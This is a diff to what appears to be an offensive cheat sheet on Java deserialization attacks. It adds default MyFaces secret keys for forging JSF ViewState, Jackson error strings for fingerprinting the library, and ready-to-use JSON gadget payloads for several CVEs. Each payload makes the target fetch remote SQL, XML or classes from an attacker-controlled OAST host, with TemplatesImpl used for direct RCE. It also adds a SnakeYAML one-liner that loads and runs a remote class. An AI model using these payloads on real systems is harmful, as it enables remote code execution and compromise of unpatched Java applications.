@@ -56,6 +56,31 @@ Generate a normal `ObjectInputStream` chain, base64 it, URL-encode, replace
 the `javax.faces.ViewState` value. No MAC unless `STATE_SAVING_METHOD=server`
 with a secret.
 
+Storage tell from the HTML body:
+- Client-side storage → `javax.faces.ViewState` value is `base64 (+ gzip) +
+  Java object` (`rO0AB...` or `H4sIAAA...`). This is the deserialization path.
+- Server-side storage → value looks like `value="-XXX:-XXXX"` (an opaque server
+  token); the object never travels, so no deserialization here.
+
+**Apache MyFaces with a documented default secret.** MyFaces client-side
+ViewState is `encrypt → HMAC → base64 → urlencode`. If the deploy left the
+default `org.apache.myfaces.SECRET` / `MAC_SECRET` in `web.config`/`*.xml`, you
+can mint a valid, MAC-correct ViewState. Default algorithm is DES-ECB +
+HMAC-SHA1. Documented default secrets to try:
+
+| Algorithm | Base64 key |
+|---|---|
+| DES | `NzY1NDMyMTA=` |
+| DESede (3DES) | `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz` |
+| Blowfish | `NzY1NDMyMTA3NjU0MzIxMA` |
+| AES CBC/PKCS5 | `NzY1NDMyMTA3NjU0MzIxMA==` |
+| AES CBC (alt) | `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz` |
+| AES CBC IV | `NzY1NDMyMTA3NjU0MzIxMA==` |
+
+Pipeline to build the value: `serialized-object → encrypt(secret) →
+hmac_sha1_sign(mac_secret) → base64 → urlencode`. Mojarra (JSF reference impl)
+uses a different scheme — if MyFaces secrets do not verify, treat it as Mojarra.
+
 ## Java — JSON/YAML libs via marshalsec (FastJSON, Jackson, SnakeYAML, …)
 ```bash
 mvn clean package -DskipTests          # build marshalsec.jar first
@@ -67,6 +92,52 @@ java -cp marshalsec.jar marshalsec.jndi.RMIRefServer  http://10.10.14.4:8000/#Ex
 Then feed the polymorphic JSON the sink expects, e.g. a `$type`/`@type` value
 pointing at a JdbcRowSetImpl/TemplatesImpl whose `dataSourceName` is
 `ldap://10.10.14.4:1389/Exploit`. Pair with a class-hosting HTTP server on 8000.
+
+## Java — Jackson polymorphic JSON (databind) without a JNDI server
+Jackson with Polymorphic Type Handling on (`enableDefaultTyping()` or
+`@JsonTypeInfo`) accepts a `["<className>", {...}]` wrapper-array and builds the
+named class from the JSON. Fingerprint Jackson first by sending malformed JSON
+and reading the error — these strings confirm it:
+```
+com.fasterxml.jackson.databind.exc.MismatchedInputException ...
+   need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
+org.codehaus.jackson.map ...          # older 1.x package name
+```
+Named-CVE gadgets that reach a JDBC/Spring sink (no extra LDAP server needed —
+they pull a remote SQL/XML resource themselves):
+```json
+// CVE-2017-17485 — Spring FileSystemXmlApplicationContext fetches your XML
+["org.springframework.context.support.FileSystemXmlApplicationContext","http://$RAND.oast.live/spel.xml"]
+
+// CVE-2019-12384 — logback H2 JDBC RUNSCRIPT runs SQL from your host
+["ch.qos.logback.core.db.DriverManagerConnectionSource",
+ {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://$RAND.oast.live/inject.sql'"}]
+
+// CVE-2020-36180 — commons-dbcp2 DriverAdapterCPDS, same H2 RUNSCRIPT trick
+["org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS",
+ {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://$RAND.oast.live/exec.sql'"}]
+
+// CVE-2020-9548 — Anteros DBCP, blind DNS/LDAP oracle via healthCheckRegistry
+["br.com.anteros.dbcp.AnterosDBCPConfig",{"healthCheckRegistry":"ldap://$RAND.oast.live"}]
+
+// CVE-2017-7525 — TemplatesImpl, runs a base64'd class' static initializer (true RCE)
+{"param":["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+  {"transletBytecodes":["<base64-of-your-evil-class>"],"transletName":"a.b","outputProperties":{}}]}
+```
+The H2-RUNSCRIPT chains turn into RCE by hosting an `inject.sql` whose
+`CREATE ALIAS ... AS '<java source>'` defines and calls a command-running
+function. Match the gadget class to a library you confirmed is on the classpath.
+
+## Java — SnakeYAML one-liner (no marshalsec build needed)
+If the sink is `yaml.load(...)` without `SafeConstructor`, the `ScriptEngineManager`
++ `URLClassLoader` tag fetches and runs a class from your host — JDK-only:
+```yaml
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[ !!java.net.URL ["http://$RAND.oast.live/"] ]]
+]
+```
+Host a JAR with a `META-INF/services/javax.script.ScriptEngineFactory` entry at
+that URL; the factory's constructor is your code.
 
 ## Java — staged JRMP delivery (firewalled outbound, no library chain)
 ```bash
